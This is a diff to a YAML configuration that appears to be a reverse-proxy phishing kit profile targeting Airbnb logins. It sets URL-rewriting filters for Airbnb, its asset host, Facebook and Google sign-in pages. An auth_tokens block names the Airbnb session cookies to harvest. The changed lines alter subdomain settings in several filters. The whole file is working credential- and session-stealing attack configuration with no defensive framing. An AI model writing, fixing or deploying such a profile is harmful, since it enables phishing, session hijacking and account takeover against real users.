@@ -9,11 +9,11 @@ proxy_hosts:
 sub_filters:
   - {hostname: 'www.airbnb.com', sub: 'www', domain: 'airbnb.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {hostname: 'www.airbnb.com', sub: 'www', domain: 'airbnb.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {hostname: 'a0.muscache.com', sub: 'a0', domain: 'muscache.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {hostname: 'a0.muscache.com', sub: 'a0', domain: 'muscache.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {hostname: 'a0.muscache.com', sub: 'a0', domain: 'muscache.com', search: 'src="https://{hostname}', replace: 'src="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'a0.muscache.com', sub: 'www', domain: 'muscache.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'a0.muscache.com', sub: 'www', domain: 'muscache.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {hostname: 'a0.muscache.com', sub: 'www', domain: 'muscache.com', search: 'src="https://{hostname}', replace: 'src="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {hostname: 'www.facebook.com', sub: 'www', domain: 'facebook.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json']}
-  - {hostname: 'accounts.google.com', sub: 'accounts', domain: 'google.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json']}
+  - {hostname: 'accounts.google.com', sub: 'www', domain: 'google.com', search: ':"{domain}";', replace: ':"{domain}";', mimes: ['text/html', 'application/json']}
 auth_tokens:
   - domain: '.airbnb.com'
     keys: ['_aat','_pt','_airbed_session_id','_csrf_token']
